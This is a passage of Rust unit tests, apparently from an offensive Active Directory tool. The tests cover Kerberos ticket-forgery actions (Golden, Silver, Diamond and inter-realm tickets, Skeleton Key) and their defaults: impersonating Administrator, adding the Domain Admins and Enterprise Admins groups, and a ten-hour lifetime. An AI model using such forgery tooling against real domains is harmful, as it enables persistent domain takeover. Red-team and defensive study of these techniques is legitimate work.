                ForgeAction::GoldenTicket
                    | ForgeAction::SilverTicket { .. }
                    | ForgeAction::DiamondTicket
                    | ForgeAction::EnhancedDiamond
                    | ForgeAction::InterRealmTgt { .. }
                    | ForgeAction::SkeletonKey
            )
        };

        assert!(check(&ForgeAction::GoldenTicket));
        assert!(check(&ForgeAction::SilverTicket {
            target_spn: "cifs/dc".into()
        }));
        assert!(check(&ForgeAction::DiamondTicket));
        assert!(check(&ForgeAction::EnhancedDiamond));
        assert!(check(&ForgeAction::InterRealmTgt {
            target_domain: "TARGET.LOCAL".into()
        }));
        assert!(check(&ForgeAction::SkeletonKey));
        assert!(!check(&ForgeAction::SapphireTicket));
        assert!(!check(&ForgeAction::PkinitAuth));
    }

    #[test]
    fn test_forge_config_effective_impersonate_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        assert_eq!(config.effective_impersonate(), "Administrator");
    }

    #[test]
    fn test_forge_config_effective_impersonate_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.impersonate = Some("alice".to_string());
        assert_eq!(config.effective_impersonate(), "alice");
    }

    #[test]
    fn test_forge_config_effective_groups_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        let groups = config.effective_groups();
        assert!(!groups.is_empty());
        assert!(groups.contains(&512), "should include Domain Admins (512)");
        assert!(
            groups.contains(&519),
            "should include Enterprise Admins (519)"
        );
    }

    #[test]
    fn test_forge_config_effective_groups_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.group_rids = vec![100, 200, 300];
        let groups = config.effective_groups();
        assert_eq!(groups, vec![100, 200, 300]);
    }

    #[test]
    fn test_forge_config_effective_lifetime_default() {
        let config = minimal_config(ForgeAction::GoldenTicket);
        assert_eq!(config.effective_lifetime(), 10);
    }

    #[test]
    fn test_forge_config_effective_lifetime_custom() {
        let mut config = minimal_config(ForgeAction::GoldenTicket);
        config.lifetime_hours = 24;
        assert_eq!(config.effective_lifetime(), 24);
    }
}
